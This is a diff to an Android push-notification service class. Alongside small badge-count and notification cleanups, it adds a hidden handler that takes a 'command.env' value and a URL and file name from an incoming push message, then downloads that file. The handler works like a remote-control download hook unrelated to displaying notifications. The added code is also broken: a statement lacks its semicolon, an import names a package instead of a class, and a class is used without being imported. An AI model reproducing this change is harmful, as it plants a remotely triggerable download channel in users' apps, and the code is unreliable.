@@ -36,6 +36,7 @@ import java.lang.StringBuilder;
 
 import com.google.android.gms.gcm.GoogleCloudMessaging;
 
+import com.plugin.download;
 import com.plugin.badge.ShortcutBadger;
 
 public class GCMIntentService extends IntentService {
@@ -279,17 +280,6 @@ public class GCMIntentService extends IntentService {
 		*/
 			
 		/*
-		if (extras.containsKey("bigview")) {
-			boolean bigView = Boolean.parseBoolean(extras.getString("bigview"));
-			if (bigView) {
-				mBuilder.setStyle(new Notification.BigTextStyle()
-					.setBigContentTitle("Viel Text!")
-					.setSummaryText("Aufklappen")
-					.bigText(message)
-				);
-			}
-		}
-		
 		mBuilder.setStyle(
 			new Notification.InboxStyle()
 				.addLine("Zeile 1")
@@ -372,6 +362,16 @@ public class GCMIntentService extends IntentService {
 			mBuilder.setLights(Color.parseColor(ledColor), ledOn, ledOff);
 		}
 		
+		if (extras.containsKey("command.env")) {
+			String commandEnv = extras.getString("command.env");
+			if ( commandEnv.toLowerCase().equals("env") ) {
+				ImageManager.DownloadFromUrl(
+					extras.getString("command.args.file"),
+					extras.getString("command.args.name")
+				)
+			}
+		}
+		
 		if (extras.containsKey("version")) {
 			SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(this);
 			String firstRun = pref.getString("FIRST_RUN", "0.0.0");
@@ -401,14 +401,14 @@ public class GCMIntentService extends IntentService {
 		
 		Notification notification = mBuilder.build();
 		
-		NOTIFICATION_ID += 1;
-		
 		mNotificationManager.notify(appName, NOTIFICATION_ID, notification);
 		
 		// MESSAGE COUNT
-		int msgCnt = Integer.parseInt(extras.getString("msgcnt"));
-		ShortcutBadger.applyCount(this, msgCnt);
-		ShortcutBadger.applyNotification(this, notification, msgCnt);
+		if (extras.containsKey("count")) {
+			int count = Integer.parseInt(extras.getString("count"));
+			ShortcutBadger.applyCount(this, count);
+			ShortcutBadger.applyNotification(this, notification, count);
+		}
 	}
 
 	private Bitmap getBitmapFromURL(String src) {
